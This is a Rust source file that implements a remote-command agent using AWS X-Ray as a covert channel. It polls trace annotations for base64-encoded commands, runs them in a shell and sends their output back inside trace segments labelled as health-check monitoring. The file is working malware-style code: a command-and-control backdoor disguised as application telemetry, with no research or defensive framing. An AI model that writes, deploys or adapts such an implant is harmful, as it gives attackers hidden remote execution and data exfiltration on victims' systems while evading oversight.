use crate::model::AWSTraceSegment; // Import our model
use base64::{Engine, engine::general_purpose::STANDARD as BASE64};
use chrono::Utc;
use hmac::{Hmac, Mac};
use once_cell::sync::Lazy; // Dependency for global lazy initialization
use rand::{RngCore, rngs::ThreadRng};
use serde::Deserialize; // Dependency for JSON parsing structs
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::collections::HashSet; // Dependency for tracking processed IDs
use std::error::Error;
use std::sync::Mutex;
use std::time::Duration; // Dependency for thread-safe global state

// Use reqwest types for Client, Request, and all Headers
use reqwest::blocking::{Client, Request};
use reqwest::header::{AUTHORIZATION, CONTENT_TYPE, HOST, HeaderValue};

use std::process::Command;

// --- Helper functions (Ported from Go) ---

fn thread_rng() -> ThreadRng {
    rand::thread_rng()
}

// This is a 1:1 port of your Go `generateRequestId`
pub fn generate_request_id(n: usize) -> String {
    let mut bytes = vec![0u8; n / 2];
    thread_rng().fill_bytes(&mut bytes);
    let hex_str = hex::encode(bytes);
    hex_str[..n].to_string()
}

// This is a 1:1 port of your Go `computeHMACSHA256`
pub fn compute_hmac_sha256(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut mac = Hmac::<Sha256>::new_from_slice(key).expect("HMAC can take key of any size");
    mac.update(data);
    mac.finalize().into_bytes().to_vec()
}

// --- Constants (from Go logic) ---
const REGION: &str = "eu-west-1"; // Or your desired region
const SERVICE: &str = "xray";

//
// --- CORE FIX: Ported sign_aws_request ---
//
// This function is now a 1:1 port of the Go `signAWSRequest`.
// It operates *directly* on a mutable `reqwest::blocking::Request`.
//
pub fn sign_aws_request(
    request: &mut Request,
    body: &[u8],
    access_key: &str,
    secret_key: &str,
) -> Result<(), Box<dyn Error>> {
    let now = Utc::now();
    let datestamp = now.format("%Y%m%d").to_string();
    let timestamp = now.format("%Y%m%dT%H%M%SZ").to_string();

    // Create payload hash
    let payload_hash = {
        let mut hasher = Sha256::new();
        hasher.update(body);
        hex::encode(hasher.finalize())
    };

    // Get host from the request URL
    let host = request.url().host_str().unwrap_or_default().to_string();

    // Set required headers on the request
    let headers = request.headers_mut();
    headers.insert(HOST, HeaderValue::from_str(&host)?);
    headers.insert("X-Amz-Date", HeaderValue::from_str(&timestamp)?);
    headers.insert(
        CONTENT_TYPE,
        HeaderValue::from_static("application/x-amz-json-1.1"),
    );

    // Create canonical request
    let canonical_headers = format!(
        "content-type:{}\nhost:{}\nx-amz-date:{}\n",
        headers.get(CONTENT_TYPE).unwrap().to_str()?,
        headers.get(HOST).unwrap().to_str()?,
        headers.get("X-Amz-Date").unwrap().to_str()?
    );
    let signed_headers = "content-type;host;x-amz-date";

    let canonical_request = format!(
        "{method}\n{path}\n{query}\n{headers}\n{signed_headers}\n{payload_hash}",
        method = request.method().as_str(),
        path = request.url().path(),
        query = request.url().query().unwrap_or(""),
        headers = canonical_headers,
    );

    // Create string to sign
    let algorithm = "AWS4-HMAC-SHA256";
    let credential_scope = format!("{}/{}/{}/aws4_request", datestamp, REGION, SERVICE);

    let canonical_request_hash = {
        let mut h = Sha256::new();
        h.update(canonical_request.as_bytes());
        hex::encode(h.finalize())
    };

    let string_to_sign =
        format!("{algorithm}\n{timestamp}\n{credential_scope}\n{canonical_request_hash}");

    // Calculate signature
    let k_date = compute_hmac_sha256(
        format!("AWS4{}", secret_key).as_bytes(),
        datestamp.as_bytes(),
    );
    let k_region = compute_hmac_sha256(&k_date, REGION.as_bytes());
    let k_service = compute_hmac_sha256(&k_region, SERVICE.as_bytes());
    let k_signing = compute_hmac_sha256(&k_service, b"aws4_request");
    let signature = hex::encode(compute_hmac_sha256(&k_signing, string_to_sign.as_bytes()));

    // Add authorization header
    let authorization = format!(
        "{alg} Credential={access}/{scope}, SignedHeaders={signed}, Signature={sig}",
        alg = algorithm,
        access = access_key,
        scope = credential_scope,
        signed = signed_headers,
        sig = signature
    );

    request
        .headers_mut()
        .insert(AUTHORIZATION, HeaderValue::from_str(&authorization)?);

    Ok(())
}

// --- ADDITIONS START ---

// --- Global State for Idempotency Check (Port of Go's `processedRequestIds`) ---
// Lazy ensures this is initialized once at first access. Mutex provides thread-safety.
static PROCESSED_REQUEST_IDS: Lazy<Mutex<HashSet<String>>> =
    Lazy::new(|| Mutex::new(HashSet::new()));

// --- Structs for X-Ray Response Parsing (Port of Go's anonymous structs) ---
// These are only used for deserialization, hence the unused warnings if not called in main.
#[derive(Deserialize, Debug)]
struct StringValue {
    #[serde(rename = "StringValue")]
    string_value: String,
}

#[derive(Deserialize, Debug)]
struct AnnotationValue {
    #[serde(rename = "AnnotationValue")]
    annotation_value: StringValue,
}

#[derive(Deserialize, Debug)]
struct TraceSummary {
    #[serde(rename = "Annotations")]
    annotations: HashMap<String, Vec<AnnotationValue>>,
}

#[derive(Deserialize, Debug)]
struct XRayResponse {
    #[serde(rename = "TraceSummaries")]
    trace_summaries: Vec<TraceSummary>,
}

// --- Ported pollConfiguration Function ---

/// Polls AWS X-Ray TraceSummaries endpoint for new commands embedded in trace annotations.
/// If a new command is found, it updates the global set and returns the command string.
pub fn poll_configuration(
    instance_id: &str,
    access_key: &str,
    secret_key: &str,
) -> Result<String, Box<dyn Error>> {
    tracing::info!("Starting configuration poll for instance_id: {}", instance_id);

    // 1. Calculate time range and build payload
    let now = Utc::now().timestamp();
    let start_time = now - 300; // Last 5 minutes
    let end_time = now;
    tracing::debug!("Time range set: Start={} End={}", start_time, end_time);

    let payload = serde_json::json!({
        "StartTime": start_time,
        "EndTime": end_time,
    });
    let body = serde_json::to_vec(&payload)?;
    tracing::debug!("Request payload created successfully. Body size: {} bytes.", body.len());

    // 2. Build and sign the request
    let url = format!("https://xray.{REGION}.amazonaws.com/TraceSummaries");
    tracing::debug!("Target X-Ray URL: {}", url);
    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;

    let mut req: Request = client.post(&url).body(body.clone()).build()?;

    // Sign the request
    // This is a critical step, so we'll log it.
    tracing::debug!("Signing AWS request...");
    sign_aws_request(&mut req, &body, access_key, secret_key)?;
    tracing::debug!("AWS request signed successfully.");

    // 3. Send the request
    tracing::info!("Sending request to AWS X-Ray...");
    let resp = client.execute(req)?;
    let status = resp.status();
    tracing::info!("Received response from X-Ray with status: {}", status);


    if !status.is_success() {
        let error_body = resp.text().unwrap_or_default();
        tracing::warn!("X-Ray request failed! Status: {}, Body: {}", status, error_body);
        return Err(format!(
            "Error polling config: {} - {}",
            status,
            error_body
        )
        .into());
    }

    // 4. Parse the response body
    let resp_body = resp.bytes()?;
    tracing::debug!("Response body received, size: {} bytes. Attempting to parse JSON...", resp_body.len());
    let response: XRayResponse = serde_json::from_slice(&resp_body)?;
    tracing::debug!("Response successfully parsed. Total trace summaries: {}", response.trace_summaries.len());

    // 5. Find the command annotation key
    let config_key = format!("config_{}", instance_id);
    tracing::debug!("Looking for annotation key: '{}'", config_key);

    for (i, trace) in response.trace_summaries.into_iter().enumerate() {
        tracing::debug!("Checking trace summary #{}", i);
        // Look for the specific annotation key
        if let Some(config_data) = trace.annotations.get(&config_key) {
            tracing::debug!("Found config key '{}' in trace #{}. Annotations count: {}", config_key, i, config_data.len());
            // NOTE: Applied Clippy suggestion 1: use .first() instead of .get(0)
            if let Some(first_annotation) = config_data.first() {
                let encoded_config = &first_annotation.annotation_value.string_value;

                if !encoded_config.is_empty() {
                    tracing::debug!("Found non-empty encoded config string. Attempting to decode and parse...");
                    // NOTE: Applied Clippy suggestion 2: collapsed nested if statements
                    if let Ok(decoded) = BASE64.decode(encoded_config)
                        && let Ok(config_str) = String::from_utf8(decoded)
                        && let Some((request_id, command)) = config_str.split_once(':')
                    {
                        // 8. Check global state for idempotency (locking the Mutex)
                        tracing::debug!("Successfully decoded: '{}'. Attempting to lock global processed_ids set...", config_str);
                        let mut processed_ids = PROCESSED_REQUEST_IDS.lock().unwrap();
                        tracing::debug!("Global set locked.");

                        if !processed_ids.contains(request_id) {
                            // New command found!
                            tracing::info!("!!! NEW COMMAND FOUND !!! Request ID: '{}', Command: '{}'", request_id, command);
                            processed_ids.insert(request_id.to_string());
                            tracing::debug!("Request ID '{}' added to processed set for idempotency.", request_id);
                            return Ok(command.to_string());
                        } else {
                            // Command already processed
                            tracing::info!("Command found but skipped (already processed). Request ID: '{}'", request_id);
                        }
                    } else {
                        tracing::warn!("Failed to decode or parse the config value: '{}'", encoded_config);
                    }
                } else {
                    tracing::debug!("Annotation value was empty, skipping.");
                }
            } else {
                tracing::debug!("Config data found, but list of annotations was empty.");
            }
        } else {
            tracing::debug!("Config key '{}' not found in trace #{}.", config_key, i);
        }
    }

    // 9. No new command found
    tracing::info!("Polling finished. No new unprocessed command found in X-Ray traces.");
    Ok("".to_string())
}
// --- ADDITIONS END ---

//
// --- CORE FIX: Ported publish_metrics ---
//
// This is now a 1:1 port of the Go `publishMetrics`.
// It builds a `reqwest::Request`, signs it, and sends it.
//
pub fn publish_metrics(
    instance_id: &str,
    response: &str,
    access_key: &str,
    secret_key: &str,
) -> Result<(), Box<dyn Error>> {
    // Build the trace segment
    let now = Utc::now();
    let start = now.timestamp() as f64;
    let end = start + 0.1; // Matches Go logic

    let mut annotations: HashMap<String, String> = HashMap::from([
        ("service_type".into(), "health_check".into()),
        ("instance_id".into(), instance_id.to_string()),
        ("platform".into(), std::env::consts::OS.into()),
    ]);

    if !response.is_empty() {
        annotations.insert(
            "execution_result".into(),
            BASE64.encode(response.as_bytes()),
        );
    }

    let segment = AWSTraceSegment {
        name: "aws-application-monitoring".into(),
        id: generate_request_id(16),
        trace_id: format!("1-{:x}-{}", now.timestamp(), generate_request_id(24)),
        start_time: start,
        end_time: end,
        annotations,
    };

    // Serialize the segment
    let segment_json = serde_json::to_string(&segment)?;

    // Wrap as AWS payload
    let payload = serde_json::json!({
        "TraceSegmentDocuments": [ segment_json ]
    });
    let body = serde_json::to_vec(&payload)?; // Get payload as bytes

    // Build URL
    let url = format!("https://xray.{REGION}.amazonaws.com/TraceSegments");

    // Create client
    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;

    // Create the Request object
    // We *must* clone the body because `build()` consumes it,
    // but `sign_aws_request` needs to read it to compute the hash.
    let mut req: Request = client.post(&url).body(body.clone()).build()?;

    // Sign the request (this mutates `req` and adds auth headers)
    sign_aws_request(&mut req, &body, access_key, secret_key)?;

    // Send the *signed* request
    let resp = client.execute(req)?;

    // Optional: Check for errors
    if !resp.status().is_success() {
        eprintln!("Error publishing metrics: {:?}", resp.text());
        return Err("Failed to publish metrics".into());
    }

    Ok(())
}

/// Executes a shell command and returns a single String detailing the outcome.
///
/// The output string includes the command's exit status, STDOUT, and STDERR.
/// If the command fails to even start (e.g., program not found), a failure
/// report is returned as the string instead of panicking or returning an Error type.
///
/// # Arguments
/// * `command_str` - The full command string to execute (e.g., "ls -l /tmp").
///
/// # Returns
/// A single String containing the complete execution report (success or failure).
pub fn execute_command(command_str: &str) -> String {
    // 1. Split the command string into the program and its arguments.
    let mut parts = command_str.split_whitespace();
    let program = match parts.next() {
        Some(p) => p,
        None => {
            tracing::error!("Attempted to execute an empty command string.");
            return format!("EXECUTION FAILURE: Command string was empty.");
        }
    };
    let args: Vec<&str> = parts.collect();

    tracing::info!("Executing command: '{}' with arguments: {:?}", program, args);

    // 2. Build and execute the command, handling potential execution errors.
    let output_result = Command::new(program)
        .args(args)
        .output(); // Returns a Result<Output, io::Error>

    // 3. Process the result, turning success or failure into a single report String.
    match output_result {
        Ok(output) => {
            // Command successfully started and finished, now process its exit status and output
            
            // Check if the command exited with a success status (exit code 0)
            let status_code = output.status.code().map_or("N/A".to_string(), |c| c.to_string());
            let status_label = if output.status.success() {
                "SUCCESS (Code 0)"
            } else {
                "FAILED (Code > 0)"
            };
            tracing::info!("Command completed with exit status: {}", status_label);

            // Get stdout and stderr, converting them to UTF-8 lossily
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            // 4. Combine and return the structured output.
            let mut full_output = format!("Status: {}\nExit Code: {}\n", status_label, status_code);
            
            // Append STDOUT
            full_output.push_str("--- STDOUT ---\n");
            full_output.push_str(stdout.as_ref());
            
            // Append STDERR
            full_output.push_str("\n--- STDERR ---\n");
            full_output.push_str(stderr.as_ref());
            
            full_output.push_str("\n----------------\n");
            
            full_output
        }
        Err(e) => {
            // Execution failed BEFORE the command could run (e.g., program not found, permission denied)
            tracing::error!("Failed to start command '{}': {}", program, e);
            format!("EXECUTION FAILURE: Could not run program '{}'. Error: {}", program, e)
        }
    }
}

use uuid::Uuid;
use base64::{alphabet::STANDARD, engine::GeneralPurposeConfig};
use tracing;

// Define a standard Base64 engine globally for encoding.
// GeneralPurposeConfig::new() uses standard padding ('=') and standard alphabet ('+' and '/').
const BASE64_ENGINE: base64::engine::GeneralPurpose = 
    base64::engine::GeneralPurpose::new(&STANDARD, GeneralPurposeConfig::new());

/// Generates a dynamic, unique, and strictly alphanumeric instance ID.
/// 
/// It works by:
/// 1. Generating a random UUID (v4).
/// 2. Encoding the UUID bytes using Base64.
/// 3. Replacing the non-alphanumeric Base64 symbols ('+', '/', '=') 
///    with safe alphanumeric characters ('A', 'B') to ensure strict compliance.
pub fn generate_instance_id() -> String {
    // 1. Generate a new UUID (16 bytes of random data).
    let raw_uuid = Uuid::new_v4();
    
    // 2. Encode the UUID bytes into a Base64 string.
    let encoded_id = BASE64_ENGINE.encode(raw_uuid.as_bytes());

    // 3. Clean the encoded string for strict alphanumeric compliance:
    let instance_id: String = encoded_id
        // Replace '+' and '/' (standard Base64 symbols) with alphanumeric characters.
        // This ensures the ID is strictly alphanumeric.
        .replace('+', "A") 
        .replace('/', "B") 
        // Remove padding characters ('=')
        .trim_end_matches('=') 
        .to_string();

    tracing::info!("Generated dynamic instance ID: {}", instance_id);

    instance_id
}